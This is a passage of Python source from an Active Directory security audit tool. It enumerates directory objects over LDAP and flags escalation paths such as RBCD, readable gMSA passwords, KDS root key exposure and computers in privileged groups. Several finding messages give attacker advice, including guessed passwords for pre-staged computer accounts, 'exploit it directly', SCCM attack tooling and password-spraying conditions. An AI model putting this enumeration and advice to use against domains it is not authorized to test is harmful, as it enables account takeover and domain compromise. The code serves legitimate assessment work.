        self.gpos:          List[Dict] = []
        self.sites:         List[Dict] = []
        self.subnets:       List[Dict] = []
        self.psoes:         List[Dict] = []
        self.ous:           List[Dict] = []
        self.cert_templates:List[Dict] = []
        self.enrollment_svcs:List[Dict] = []
        self.dns_zones:     List[Dict] = []
        self.schema_version: int = 0
        self.forest_level:   int = -1
        self.domain_level:   int = -1
        self.krbtgt:        Optional[Dict] = None
        self.guest:         Optional[Dict] = None
        self.pre_win2000:   Optional[Dict] = None
        self.protected_users:Optional[Dict] = None
        self.admin_sd_holder:Optional[Dict] = None
        self.priv_group_members: Dict[str, List[str]] = {}
        self.laps_installed: bool = False
        self.adws_available: bool = False
        self.ds_heuristics:  str  = ""
        self.ms_ds_other_settings: List[str] = []
        # populated by SYSVOLChecker
        self.sysvol_scanned: bool = False   # True only if SYSVOL was readable
        self.sysvol_data: Dict = {
            "gpp_passwords": [],       # [{gpo_name, file, username, cpassword, plaintext}]
            "registry_pol":  [],       # [{gpo_name, key, name, regtype, data}]
            "inf_settings":  [],       # [{gpo_name, section, key, value}]
            "gpo_files":     [],       # raw file paths found
        }
        # populated by ACLAnalyzer
        self.acl_findings: List[Dict] = []
        self.machine_account_quota: int = -1
        # populated by ControlPathAnalyzer
        self.control_paths: Dict = {"count": 0, "broad": [], "paths": []}

    def collect(self):
        # Each step is isolated so one failure (permissions, an odd object, a
        # transient error) degrades that section only instead of zeroing the
        # whole assessment.
        steps = [
            ("domain information",        self._collect_domain_info),
            ("user accounts",            self._collect_users),
            ("computer accounts",        self._collect_computers),
            ("groups",                   self._collect_groups),
            ("domain controllers",       self._collect_dcs),
            ("trust relationships",      self._collect_trusts),
            ("GPOs",                     self._collect_gpos),
            ("sites/subnets",            self._collect_sites),
            ("password settings objects",self._collect_psoes),
            ("OUs / GPO links",          self._collect_ous),
        ]
        if not self.args.no_adcs:
            steps.append(("ADCS objects", self._collect_adcs))
        steps.append(("DNS zones", self._collect_dns))
        self.collect_errors: List[str] = []
        for label, fn in steps:
            print(f"[*] Collecting {label}...")
            try:
                fn()
            except Exception as e:
                self.collect_errors.append(f"{label}: {e}")
                print(f"[!] Collection of {label} failed: {e}")
                if self.args.verbose:
                    traceback.print_exc()
        print("[*] Checking ADWS availability...")
        try:
            self.adws_available = check_port(self.args.dc_ip, 9389, timeout=3)
        except Exception:
            pass
        n = sum(len(x) for x in (self.users, self.computers, self.dcs)) + len(self.groups)
        print(f"[*] Data collection complete "
              f"({len(self.users)} users, {len(self.computers)} computers, "
              f"{len(self.groups)} groups, {len(self.dcs)} DCs).")
        if not n:
            print("[!] WARNING: no directory objects were collected — results "
                  "will be incomplete. Check account rights and connectivity.")

    # ── domain ───────────────────────────────────────────────────────────────

    def _collect_domain_info(self):
        c = self.conn
        # Root DSE already fetched; read domain object
        r = c.search_one(self.base, "(objectClass=domain)", [
            "minPwdLength","maxPwdAge","minPwdAge","pwdProperties",
            "pwdHistoryLength","lockoutThreshold","lockoutDuration",
            "lockoutObservationWindow","ms-DS-MachineAccountQuota",
            "nTMixedDomain","objectSid","msDS-Behavior-Version",
            "gPLink","gPOptions","distinguishedName","dc","name",
            "wellKnownObjects","otherWellKnownObjects",
        ])
        self.domain_obj = r

        # Functional levels — read from the connection (populated for both the
        # ldap3 and impacket/Kerberos backends at connect time).
        self.domain_level = getattr(c, "domain_func", -1)
        self.forest_level = getattr(c, "forest_func", -1)

        sv = c.search_one(self.sch, "(objectClass=dMD)", ["objectVersion"])
        if sv:
            self.schema_version = get_int(sv["attrs"], "objectVersion")

        # ds-heuristics (on Directory Service object)
        ds_obj = c.search_one(
            f"CN=Directory Service,CN=Windows NT,CN=Services,{self.cfg}",
            "(objectClass=nTDSService)",
            ["dSHeuristics","msDS-Other-Settings"])
        if ds_obj:
            self.ds_heuristics = get_str(ds_obj["attrs"], "dSHeuristics")
            self.ms_ds_other_settings = get_list(ds_obj["attrs"], "msDS-Other-Settings")

        self.krbtgt = c.search_one(self.base, "(sAMAccountName=krbtgt)", [
            "pwdLastSet","whenCreated","whenChanged","userAccountControl",
            "distinguishedName","msDS-SupportedEncryptionTypes"])

        self.guest = c.search_one(self.base, "(sAMAccountName=Guest)", [
            "userAccountControl","pwdLastSet","distinguishedName"])

        # pre-win2000 compat access group
        self.pre_win2000 = c.search_one(
            self.base, "(sAMAccountName=Pre-Windows 2000 Compatible Access)",
            ["member","objectSid","distinguishedName"])

        # protected users
        self.protected_users = c.search_one(
            self.base, "(sAMAccountName=Protected Users)",
            ["member","distinguishedName"])

        # AdminSDHolder
        self.admin_sd_holder = c.search_one(
            f"CN=System,{self.base}", "(cn=AdminSDHolder)",
            ["nTSecurityDescriptor","distinguishedName"])

        # Machine account quota
        if self.domain_obj:
            self.machine_account_quota = get_int(
                self.domain_obj["attrs"], "ms-DS-MachineAccountQuota", -1)

        # LAPS schema check
        laps_attr = c.search_one(self.sch,
            "(lDAPDisplayName=ms-Mcs-AdmPwd)", ["lDAPDisplayName"])
        if not laps_attr:
            laps_attr = c.search_one(self.sch,
                "(lDAPDisplayName=msLAPS-Password)", ["lDAPDisplayName"])
        self.laps_installed = laps_attr is not None

    # ── users ────────────────────────────────────────────────────────────────

    def _collect_users(self):
        self.users = self.conn.paged_search(self.base,
            "(&(objectClass=user)(objectCategory=person))", [
            "sAMAccountName","userAccountControl","pwdLastSet",
            "lastLogonTimestamp","adminCount","memberOf",
            "servicePrincipalName","sIDHistory","msDS-SupportedEncryptionTypes",
            "mail","distinguishedName","userPrincipalName","description",
            "whenCreated","accountExpires","badPasswordTime","badPwdCount",
            "msDS-AllowedToDelegateTo","msDS-AllowedToActOnBehalfOfOtherIdentity",
            "primaryGroupID","objectSid","name","displayName"])

    # ── computers ────────────────────────────────────────────────────────────

    def _collect_computers(self):
        self.computers = self.conn.paged_search(self.base,
            "(objectClass=computer)", [
            "sAMAccountName","userAccountControl","pwdLastSet",
            "lastLogonTimestamp","operatingSystem","operatingSystemVersion",
            "dNSHostName","servicePrincipalName","adminCount",
            "msDS-SupportedEncryptionTypes","sIDHistory",
            "msDS-AllowedToDelegateTo","msDS-AllowedToActOnBehalfOfOtherIdentity",
            "ms-Mcs-AdmPwdExpirationTime","msLAPS-PasswordExpirationTime",
            "distinguishedName","msDS-IsRODC","primaryGroupID","whenCreated",
            "objectSid","name","logonCount"])

    # ── groups ────────────────────────────────────────────────────────────────

    PRIV_GROUPS = [
        "Domain Admins","Schema Admins","Enterprise Admins","Administrators",
        "Group Policy Creator Owners","DNSAdmins","Account Operators",
        "Backup Operators","Server Operators","Print Operators",
        "Pre-Windows 2000 Compatible Access","Protected Users",
        "Remote Management Users","DnsAdmins",
        "Cert Publishers","Key Admins","Enterprise Key Admins",
        "Exchange Windows Permissions","Exchange Trusted Subsystem",
    ]

    def _collect_groups(self):
        raw = self.conn.paged_search(self.base, "(objectClass=group)", [
            "sAMAccountName","member","memberOf","groupType",
            "adminCount","objectSid","distinguishedName","description",
            "name"])
        for g in raw:
            name = get_str(g["attrs"], "sAMAccountName").lower()
            self.groups[name] = g

        # Build a primaryGroupID -> [accounts] index once. Primary-group
        # membership is NOT stored in the group's `member` attribute, so the
        # recursive in-chain query below misses it (a known AD blind spot used
        # both legitimately and as an evasion). We fold it back in per group.
        pg_index: Dict[int, List[Dict]] = defaultdict(list)
        for obj in self.users + self.computers:
            pgid = get_int(obj["attrs"], "primaryGroupID", 0)
            if pgid:
                pg_index[pgid].append(obj)

        # privileged group membership (recursive via LDAP_MATCHING_RULE_IN_CHAIN)
        for gname in self.PRIV_GROUPS:
            gr = self.groups.get(gname.lower())
            if not gr:
                continue
            gdn = gr["dn"]
            members = self.conn.paged_search(self.base,
                f"(memberOf:1.2.840.113556.1.4.1941:={gdn})",
                ["sAMAccountName","distinguishedName","userAccountControl",
                 "pwdLastSet","lastLogonTimestamp","servicePrincipalName",
                 "adminCount","msDS-SupportedEncryptionTypes","mail","whenCreated"])
            seen = {m["dn"] for m in members}
            # add accounts whose PRIMARY group RID matches this group
            grp_rid = None
            sid = sid_to_str(gr["attrs"].get("objectSid", [b""])[0]
                             if isinstance(gr["attrs"].get("objectSid"), list)
                             else gr["attrs"].get("objectSid"))
            try:
                grp_rid = int(sid.rsplit("-", 1)[1]) if sid.startswith("S-") else None
            except (ValueError, IndexError):
                grp_rid = None
            if grp_rid is not None:
                for obj in pg_index.get(grp_rid, []):
                    if obj["dn"] not in seen:
                        members.append(obj)
                        seen.add(obj["dn"])
            self.priv_group_members[gname] = members

    # ── domain controllers ───────────────────────────────────────────────────

    def _collect_dcs(self):
        # DCs from computers with SERVER_TRUST bit
        self.dcs = self.conn.paged_search(self.base,
            "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", [
            "sAMAccountName","dNSHostName","operatingSystem","operatingSystemVersion",
            "pwdLastSet","lastLogonTimestamp","userAccountControl",
            "msDS-IsRODC","distinguishedName","whenCreated","objectSid"])

        # RODC via nTDSDSA objects
        self.rodcs = self.conn.paged_search(
            f"CN=Sites,{self.cfg}",
            "(objectClass=nTDSDSA)",
            ["distinguishedName","msDS-IsRODC",
             "msDS-NeverRevealGroup","msDS-RevealOnDemandGroup"])

    # ── trusts ────────────────────────────────────────────────────────────────

    def _collect_trusts(self):
        self.trusts = self.conn.paged_search(self.base,
            "(objectClass=trustedDomain)", [
            "name","flatName","securityIdentifier","trustAttributes",
            "trustDirection","trustType","trustPartner",
            "whenCreated","whenChanged","distinguishedName"])

    # ── GPOs ──────────────────────────────────────────────────────────────────

    def _collect_gpos(self):
        self.gpos = self.conn.paged_search(self.base,
            "(objectClass=groupPolicyContainer)", [
            "displayName","gPCFileSysPath","flags","versionNumber",
            "gPCFunctionalityVersion","distinguishedName","whenChanged",
            "cn"])

    # ── sites / subnets ───────────────────────────────────────────────────────

    def _collect_sites(self):
        self.sites = self.conn.paged_search(
            f"CN=Sites,{self.cfg}",
            "(objectClass=site)", ["cn","distinguishedName","gPLink"])
        self.subnets = self.conn.paged_search(
            f"CN=Subnets,CN=Sites,{self.cfg}",
            "(objectClass=subnet)", ["cn","siteObject","description"])

    # ── fine-grained PSOs ────────────────────────────────────────────────────

    def _collect_psoes(self):
        self.psoes = self.conn.paged_search(
            f"CN=Password Settings Container,CN=System,{self.base}",
            "(objectClass=msDS-PasswordSettings)", [
            "cn","msDS-MinimumPasswordLength","msDS-PasswordComplexityEnabled",
            "msDS-MaximumPasswordAge","msDS-LockoutThreshold",
            "msDS-AppliesTo","msDS-PasswordHistoryLength",
            "msDS-PSOAppliesTo"])

    # ── OUs / GPO links ───────────────────────────────────────────────────────

    def _collect_ous(self):
        # gPLink on OUs (and the domain root, already collected) lets the
        # control-path analyzer resolve which GPOs actually apply to DCs/Tier-0
        # rather than assuming every GPO reaches Tier 0.
        self.ous = self.conn.paged_search(
            self.base, "(objectClass=organizationalUnit)",
            ["distinguishedName", "name", "gPLink", "gPOptions"])

    # ── ADCS ─────────────────────────────────────────────────────────────────

    def _collect_adcs(self):
        pks_base = f"CN=Public Key Services,CN=Services,{self.cfg}"
        self.cert_templates = self.conn.paged_search(
            f"CN=Certificate Templates,{pks_base}",
            "(objectClass=pKICertificateTemplate)", [
            "cn","displayName","msPKI-Certificate-Name-Flag",
            "msPKI-Enrollment-Flag","msPKI-RA-Signature",
            "pKIExtendedKeyUsage","nTSecurityDescriptor",
            "msPKI-Private-Key-Flag","msPKI-Template-Schema-Version",
            "msPKI-Cert-Template-OID","flags"])
        self.enrollment_svcs = self.conn.paged_search(
            f"CN=Enrollment Services,{pks_base}",
            "(objectClass=pKIEnrollmentService)", [
            "cn","dNSHostName","cACertificate","distinguishedName",
            "certificateTemplates","msPKI-Enrollment-Servers",
            "nTSecurityDescriptor","flags"])
        # Build set of template names actually published to a CA
        self._published_templates: Set[str] = set()
        for svc in self.enrollment_svcs:
            for tname in get_list(svc["attrs"], "certificateTemplates"):
                self._published_templates.add(tname.strip())

    # ── DNS ───────────────────────────────────────────────────────────────────

    def _collect_dns(self):
        for dns_base in [
            f"CN=MicrosoftDNS,DC=DomainDnsZones,{self.base}",
            f"CN=MicrosoftDNS,DC=ForestDnsZones,{self.base}",
            f"CN=MicrosoftDNS,CN=System,{self.base}",
        ]:
            zones = self.conn.paged_search(
                dns_base, "(objectClass=dnsZone)", [
                "name","dnsProperty","distinguishedName"])
            self.dns_zones.extend(zones)


# ─────────────────────────────────────────────────────────────────────────────
# CHECK ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class CheckEngine:
    """Runs all checks against collected ADData and returns a list of Findings."""

    def __init__(self, data: ADData, args):
        self.d     = data
        self.args  = args
        self.findings: List[Finding] = []
        self._now  = datetime.datetime.now(tz=datetime.timezone.utc)

    def _rule(self, rule_id: str) -> Tuple[str, str, int, str]:
        return RULES.get(rule_id, (rule_id, "Anomaly", 5, "MEDIUM"))

    def _add(self, rule_id: str, details: str = "", affected: List[str] = None):
        if rule_id in SUPPRESSED_RULES:   # non-actionable on an engagement
            return
        t, cat, pts, sev = self._rule(rule_id)
        aff = _dedup_keep_order(affected or [])
        self.findings.append(Finding(
            rule_id=rule_id, title=t, category=cat,
            points=scaled_points(rule_id, pts, len(aff)), severity=sev,
            details=details, affected=aff,
            maturity=rule_maturity(rule_id, sev),
            mitre=RULE_MITRE.get(rule_id, [])))

    def run_all(self):
        self._check_anomaly()
        self._check_privileged()
        self._check_stale()
        self._check_trust()
        self._check_gpo_sysvol()
        self._check_acl()
        self._check_extra()
        self._check_modern()

    # =========================================================================
    # MODERN ESCALATION CHECKS (v2)  — RBCD, constrained delegation, computer
    # accounts in privileged groups, orphaned adminCount, privileged SID history
    # =========================================================================

    def _check_modern(self):
        self._m_rbcd()
        self._m_constrained_delegation()
        self._m_computer_in_priv_group()
        self._m_admincount_orphan()
        self._m_sidhistory_privileged()
        self._m_sccm()
        self._m_pre2k_computers()
        self._m_weak_lockout()
        self._m_managed_accounts()
        self._m_kds_root_key()
        self._m_entra()
        self._m_orphaned_gpos()
        self._m_control_paths()

    def _m_managed_accounts(self):
        """gMSA / dMSA whose managed password a broad principal may read (roadmap
        item 2). msDS-GroupMSAMembership names who can retrieve msDS-ManagedPassword."""
        if not HAS_IMPACKET_LDAP:
            return
        try:
            objs = self.d.conn.paged_search(
                self.d.base,
                "(|(objectClass=msDS-GroupManagedServiceAccount)"
                "(objectClass=msDS-DelegatedManagedServiceAccount))",
                ["sAMAccountName", "msDS-GroupMSAMembership",
                 "servicePrincipalName", "memberOf"])
        except Exception:
            objs = []
        broad = self._broad_low_priv_sids()
        affected = []
        for o in objs:
            a = o["attrs"]; sam = get_str(a, "sAMAccountName")
            raw = a.get("msDS-GroupMSAMembership")
            if isinstance(raw, list):
                raw = raw[0] if raw else None
            if not isinstance(raw, (bytes, bytearray)):
                continue
            try:
                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
            except Exception:
                continue
            dacl = sd["Dacl"]
            if not dacl:
                continue
            readers = []
            for ace in dacl["Data"]:
                try:
                    if "DENIED" in ace["TypeName"].upper():
                        continue
                    sidstr = ace["Ace"]["Sid"].formatCanonical()
                except Exception:
                    continue
                if sidstr in broad:
                    readers.append(broad[sidstr])
            if readers:
                affected.append(f"{sam} ← {', '.join(_dedup_keep_order(readers))}")
        if affected:
            self._add("P-GMSAReadable",
                      "A broad principal can retrieve these managed (gMSA/dMSA) "
                      "passwords. Read the password, derive the NT hash and "
                      "authenticate as the (often privileged) service account. "
                      "Principal(s) after '←' can read it.",
                      affected)

    def _m_kds_root_key(self):
        """KDS root key over-exposure — GoldenGMSA offline compromise (roadmap 2).

        Report only when a BROAD / low-privileged principal is granted read on the
        KDS root key object, parsed from its security descriptor. Keying off "can
        the current bind read msKds-RootKeyData" was a false positive: by Windows
        design only SYSTEM/Domain Admins can read it, so a privileged bind (a
        supported run mode) would trip it on every healthy domain."""
        if not HAS_IMPACKET_LDAP:
            return
        base = (f"CN=Master Root Keys,CN=Group Key Distribution Service,"
                f"CN=Services,{self.d.cfg}")
        try:
            keys = self.d.conn.paged_search(
                base, "(objectClass=msKds-ProvRootKey)",
                ["cn", "nTSecurityDescriptor", "whenCreated"])
        except Exception:
            keys = []
        broad = self._broad_low_priv_sids()
        READ_RIGHTS = (self._ADS_GENERIC_ALL | 0x80000000     # GENERIC_ALL | GENERIC_READ
                       | 0x00000010 | self._ADS_CONTROL_ACCESS)  # READ_PROP | CONTROL_ACCESS
        affected = []
        for k in keys:
            raw = k["attrs"].get("nTSecurityDescriptor")
            if isinstance(raw, list):
                raw = raw[0] if raw else None
            if not isinstance(raw, (bytes, bytearray)):
                continue
            try:
                sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
            except Exception:
                continue
            dacl = sd["Dacl"]
            if not dacl:
                continue
            readers = []
            for ace in dacl["Data"]:
                try:
                    if "DENIED" in ace["TypeName"].upper():
                        continue
                    mask = int(ace["Ace"]["Mask"]["Mask"])
                    sidstr = ace["Ace"]["Sid"].formatCanonical()
                except Exception:
                    continue
                if sidstr in broad and (mask & READ_RIGHTS):
                    readers.append(broad[sidstr])
            if readers:
                cn = get_str(k["attrs"], "cn") or dn_base(k.get("dn", ""))
                affected.append(f"{cn} ← {', '.join(_dedup_keep_order(readers))}")
        if affected:
            self._add("A-KDSRootKey",
                      "A broad / low-privileged principal is granted read on the KDS "
                      "root key (principal(s) after '←'). With the root key, every "
                      "gMSA password in the forest can be computed offline "
                      "(GoldenGMSA) — only Domain Admins/SYSTEM should be able to "
                      "read it.",
                      affected)

    def _m_entra(self):
        """On-prem-readable Entra / AAD-Connect indicators (roadmap item 3)."""
        msol = []
        for u in self.d.users:
            sam = get_str(u["attrs"], "sAMAccountName")
            if sam.upper().startswith("MSOL_"):
                msol.append(sam)
        if msol:
            self._add("A-AADConnectSync",
                      "Azure AD Connect synchronization account(s) found. The "
                      "on-prem sync account holds DCSync rights (for Password Hash "
                      "Sync); compromising the AD Connect host recovers its "
                      "credentials and bridges on-prem AD ⇄ Entra ID.",
                      msol)
        for c in self.d.computers:
            sam = get_str(c["attrs"], "sAMAccountName")
            if sam.upper().rstrip("$") == "AZUREADSSOACC":
                age = days_since(filetime_to_dt(get_int(c["attrs"], "pwdLastSet")))
                if age is not None and age > 90:
                    self._add("A-SeamlessSSO",
                              f"Entra Seamless SSO account {sam} key is {age} days "
                              "old (recommended rotation: 30 days). A recovered "
                              "stale key allows forging silver tickets to Entra ID "
                              "as any synced user.",
                              [f"{sam} (pwd {age}d old)"])

    def _m_orphaned_gpos(self):
        """OU/gPLink inventory — GPOs linked nowhere (roadmap item 5)."""
        linked = set()
        gplinks = []
        if self.d.domain_obj:
            gplinks.append(get_str(self.d.domain_obj["attrs"], "gPLink"))
        for cont in list(getattr(self.d, "ous", [])) + list(self.d.sites):
            gplinks.append(get_str(cont["attrs"], "gPLink"))
        for gp in gplinks:
            for gdn in ControlPathAnalyzer._parse_gplink(gp):
                linked.add(gdn.lower())
        orphaned = []
        for g in self.d.gpos:
            dn = g.get("dn", "")
            if dn and dn.lower() not in linked:
                orphaned.append(get_str(g["attrs"], "displayName") or dn_base(dn))
        if orphaned:
            self._add("S-OrphanedGPO",
                      "These GPOs are not linked to the domain, any OU or any "
                      "site — they apply to nothing but retain their settings and "
                      "DACLs. Review and remove, or relink if they should be active.",
                      orphaned)

    def _m_control_paths(self):
        cp = getattr(self.d, "control_paths", None) or {}
        count = cp.get("count", 0); broad = cp.get("broad", [])
        if not count:
            return
        # readable one-liners for the affected list
        def path_str(p):
            if not p:
                return ""
            s = p[0][0]
            for src, label, dst in p:
                s += f" --[{label}]--> {dst}"
            return s
        samples = [f"{name}: {path_str(path)}" for name, path, _ in cp.get("paths", [])]
        if broad:
            self._add("P-ControlPathIndirectEveryone",
                      f"A broad principal ({', '.join(broad)}) has a control path to a Tier-0 "
                      "group — i.e. ANY authenticated user can escalate to Domain Admin. "
                      "Walk the chain and remove the first dangerous edge.",
                      samples or broad)
        else:
            self._add("P-ControlPathDA",
                      f"{count} non-privileged principal(s) can reach Domain Admin through a "
                      "chain of group membership and dangerous ACLs/ownership (not direct "
                      "membership). These are the multi-hop escalation routes to fix first.",
                      samples)
        if count >= 25:
            self._add("P-ControlPathIndirectMany",
                      f"{count} distinct non-privileged principals have a control path to "
                      "Tier-0 — a very wide takeover blast radius indicating ACL sprawl.",
                      [f"{count} principals with a path to Domain Admin"])

    def _m_sccm(self):
        """SCCM/MECM publishes management points + site servers to AD — a prime
        relay / NAA / PXE target. Surface them so the operator knows to go after it."""
        base = f"CN=System Management,CN=System,{self.d.base}"
        try:
            objs = self.d.conn.paged_search(
                base, "(|(objectClass=mSSMSManagementPoint)(objectClass=mSSMSSite)"
                      "(objectClass=mSSMSRoamingBoundaryRange))",
                ["dNSHostName", "mSSMSSiteCode", "mSSMSMPName", "name", "cn"])
        except Exception:
            objs = []
        servers, sites = [], set()
        for o in objs:
            a = o["attrs"]
            host = get_str(a, "dNSHostName") or get_str(a, "mSSMSMPName") or get_str(a, "cn")
            sc = get_str(a, "mSSMSSiteCode")
            if sc:
                sites.add(sc)
            if host:
                servers.append(f"{host}{(' ['+sc+']') if sc else ''}")
        if servers:
            self._add("A-SCCM",
                      f"SCCM/MECM site infrastructure is published in AD "
                      f"(sites: {', '.join(sorted(sites)) or 'n/a'}). Management points and "
                      "site servers accept NTLM and are commonly relayable; the Network Access "
                      "Account, PXE/task-sequence secrets and the site database are frequent "
                      "paths to domain-wide compromise. Enumerate and attack with SharpSCCM / "
                      "sccmhunter, and check MP/DB SMB+MSSQL signing for relay.",
                      _dedup_keep_order(servers))
            # System Management container ACL — broad write = rogue MP / relay
            writers = self._container_broad_writers(base)
            if writers:
                self._add("A-SCCMContainerACL",
                          f"The System Management container is writable by: {', '.join(writers)}. "
                          "A non-Tier-0 principal that can write here can publish a rogue "
                          "management point and coerce clients/site servers to authenticate to it "
                          "for relay. Restrict the ACL to the site server(s).",
                          writers)

    def _container_broad_writers(self, dn):
        """Broad/low-priv principals with write/control over a container's DACL."""
        if not HAS_IMPACKET_LDAP:
            return []
        try:
            a = ACLAnalyzer(self.d.conn, self.d, self.args)
            a._build_broad_sids()
            raw = a._fetch_sd(dn)
            sd = a._parse_dacl(raw) if raw else None
            if not sd or not sd["Dacl"]:
                return []
            danger = 0x10000000 | 0x40000000 | 0x00040000 | 0x00080000 | 0x00000002  # GA/GW/WDac/WOwn/CreateChild
            out = []
            for ace in sd["Dacl"]["Data"]:
                try:
                    if "DENIED" in ace["TypeName"].upper():
                        continue
                    mask = int(ace["Ace"]["Mask"]["Mask"]); sid = a._sid_str(ace["Ace"]["Sid"])
                    name = a._broad.get(sid)
                    if name and (mask & danger):
                        out.append(name)
                except Exception:
                    continue
            return _dedup_keep_order(out)
        except Exception:
            return []

    def _m_pre2k_computers(self):
        """Pre-staged 'Pre-Windows 2000' computer accounts still hold a password
        equal to the lowercase short hostname — authenticate as the computer."""
        affected = []
        for c in self.d.computers:
            a = c["attrs"]
            uac = get_int(a, "userAccountControl")
            if uac_has(uac, UAC_ACCOUNTDISABLE):
                continue
            if not uac_has(uac, UAC_WORKSTATION_TRUST):
                continue
            # canonical signature: PASSWD_NOTREQD on a never-logged-on workstation
            never_used = get_int(a, "logonCount", 0) == 0
            if uac_has(uac, UAC_PASSWD_NOTREQD) and never_used:
                sam = get_str(a, "sAMAccountName")
                guess = sam[:-1].lower() if sam.endswith("$") else sam.lower()
                affected.append(f"{sam} (try password: {guess})")
        if affected:
            self._add("A-Pre2kComputer",
                      "Pre-created computer accounts carry PASSWD_NOTREQD and have never logged "
                      "on — the password is almost certainly the lowercase short hostname "
                      "(Pre-Windows 2000 pre-staging). Authenticate as the computer to obtain a "
                      "TGT and pivot (LAPS read, RBCD, shadow credentials).",
                      affected)

    def _m_weak_lockout(self):
        """No / weak lockout = password spraying is free."""
        dom = self.d.domain_obj
        if not dom:
            return
        thr = get_int(dom["attrs"], "lockoutThreshold", -1)
        if thr == 0:
            self._add("A-WeakLockout",
                      "Account lockout threshold is 0 — accounts NEVER lock out. Domain-wide "
                      "password spraying can run unthrottled. This is the most reliable initial-"
                      "access path on internal tests.",
                      ["lockoutThreshold=0 (disabled)"])
        elif thr > 10:
            self._add("A-WeakLockout",
                      f"Account lockout threshold is {thr} (high) — slow password spraying stays "
                      "under the limit. Lower it and pair with smart-lockout / Azure password "
                      "protection.",
                      [f"lockoutThreshold={thr}"])

    # privileged RIDs and well-known built-in SIDs that must never appear in
    # an account's SID history (classic stealth-persistence backdoor).
    _PRIV_RIDS = {512, 516, 518, 519, 520, 521, 526, 527}
    _PRIV_BUILTIN = {
        "S-1-5-32-544": "Administrators", "S-1-5-32-548": "Account Operators",
        "S-1-5-32-549": "Server Operators", "S-1-5-32-550": "Print Operators",
        "S-1-5-32-551": "Backup Operators", "S-1-5-32-552": "Replicators",
        "S-1-5-32-557": "Incoming Forest Trust Builders",
    }
    # Groups whose membership by a *computer* account is a real escalation.
    _SENSITIVE_GROUPS = {
        "domain admins", "enterprise admins", "schema admins", "administrators",
        "account operators", "backup operators", "server operators",
        "print operators", "group policy creator owners", "key admins",
        "enterprise key admins", "dnsadmins",
    }

    def _is_dc(self, dn: str) -> bool:
        dcdns = {d["dn"] for d in self.d.dcs}
        return dn in dcdns

    def _sid_index(self) -> Dict[str, str]:
        """objectSid -> sAMAccountName for every collected user/computer/group,
        plus well-known SIDs. Used to resolve the principals named inside a
        security descriptor (e.g. an RBCD allow-list) to readable names."""
        if getattr(self, "_sid_idx_cache", None) is not None:
            return self._sid_idx_cache
        idx: Dict[str, str] = {}
        for obj in self.d.users + self.d.computers + list(self.d.groups.values()):
            raw = obj["attrs"].get("objectSid")
            if isinstance(raw, list):
                raw = raw[0] if raw else None
            s = sid_to_str(raw) if raw else ""
            if s:
                idx[s] = get_str(obj["attrs"], "sAMAccountName") or dn_base(obj.get("dn", ""))
        idx.setdefault("S-1-1-0", "Everyone")
        idx.setdefault("S-1-5-11", "Authenticated Users")
        idx.setdefault("S-1-5-7", "Anonymous Logon")
        self._sid_idx_cache = idx
        return idx

    def _rbcd_allowed_principals(self, a) -> List[str]:
        """Principals named in msDS-AllowedToActOnBehalfOfOtherIdentity — i.e. the
        accounts that can already use S4U to impersonate any user TO this object.
        These are the specific principals an operator needs (issue #4); the bare
        target name alone doesn't say who holds the delegation."""
        raw = a.get("msDS-AllowedToActOnBehalfOfOtherIdentity")
        if isinstance(raw, list):
            raw = raw[0] if raw else None
        if not isinstance(raw, (bytes, bytearray)) or not HAS_IMPACKET_LDAP:
            return []
        try:
            sd = _ldaptypes.SR_SECURITY_DESCRIPTOR(data=raw)
        except Exception:
            return []
        idx = self._sid_index()
        out: List[str] = []
        dacl = sd["Dacl"]
        if not dacl:
            return []
        for ace in dacl["Data"]:
            try:
                if "DENIED" in ace["TypeName"].upper():
                    continue
                sidstr = ace["Ace"]["Sid"].formatCanonical()
            except Exception:
                continue
            out.append(idx.get(sidstr, sidstr))
        return _dedup_keep_order(out)

    def _m_rbcd(self):
        dc_dns = {d["dn"] for d in self.d.dcs}
        normal, dangerous = [], []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            if not get_list(a, "msDS-AllowedToActOnBehalfOfOtherIdentity") \
               and not get_str(a, "msDS-AllowedToActOnBehalfOfOtherIdentity"):
                continue
            sam = get_str(a, "sAMAccountName")
            allowed = self._rbcd_allowed_principals(a)
            who = ", ".join(allowed) if allowed else "principals unreadable from SD"
            entry = f"{sam} ← {who}"
            if obj["dn"] in dc_dns:
                dangerous.append(entry)
            else:
                normal.append(entry)
        if dangerous:
            self._add("P-RBCD-Dangerous",
                      "Resource-based constrained delegation is configured on a "
                      "domain controller object. The principal(s) named in the SD "
                      "(shown after '←') can use S4U to impersonate any user to the "
                      "DC — instant domain compromise. Investigate how it was set; "
                      "if you control a named principal, exploit it directly.",
                      dangerous)
        if normal:
            self._add("P-RBCD",
                      "These accounts have msDS-AllowedToActOnBehalfOfOtherIdentity "
                      "set (resource-based constrained delegation). The principal(s) "
                      "after '←' can impersonate any user to the host; if you control "
                      "one (or can add one via MachineAccountQuota) you take over the "
                      "host. Validate every configured delegation.",
                      normal)

    def _m_constrained_delegation(self):
        dc_dns = {d["dn"] for d in self.d.dcs}
        affected = []
        for obj in self.d.users + self.d.computers:
            a = obj["attrs"]
            targets = get_list(a, "msDS-AllowedToDelegateTo")
            if not targets or obj["dn"] in dc_dns:
                continue
            uac = get_int(a, "userAccountControl")
            sam = get_str(a, "sAMAccountName")
            # protocol transition (T2A4D) is the more dangerous variant
            transition = uac_has(uac, UAC_TRUSTED_TO_AUTH)
            tag = "+T2A4D" if transition else ""
            affected.append(f"{sam}{tag} -> {', '.join(sorted(set(targets))[:4])}")
        if affected:
            self._add("P-ConstrainedDelegService",
                      "Service accounts with constrained delegation (msDS-Allowed"
                      "ToDelegateTo). Compromise of the account allows S4U2Proxy "
                      "impersonation to the listed SPNs; '+T2A4D' marks protocol-"
                      "transition (any user can be impersonated).",
                      affected)

    def _m_computer_in_priv_group(self):
        affected = []
        for gname, members in self.d.priv_group_members.items():
            if gname.lower() not in self._SENSITIVE_GROUPS:
                continue
            for m in members:
                sam = get_str(m["attrs"], "sAMAccountName")
                uac = get_int(m["attrs"], "userAccountControl")
                is_machine = sam.endswith("$") or uac_has(uac, UAC_WORKSTATION_TRUST) \
                             or uac_has(uac, UAC_SERVER_TRUST)
                if is_machine and not self._is_dc(m["dn"]):
                    affected.append(f"{sam} in {gname}")
        if affected:
            self._add("P-ComputerInPrivGroup",
                      "Computer accounts are members of privileged groups. Whoever "
                      "controls SYSTEM on that machine (or its computer secret) "
                      "inherits the group's domain privileges.",
                      affected)

    def _m_admincount_orphan(self):
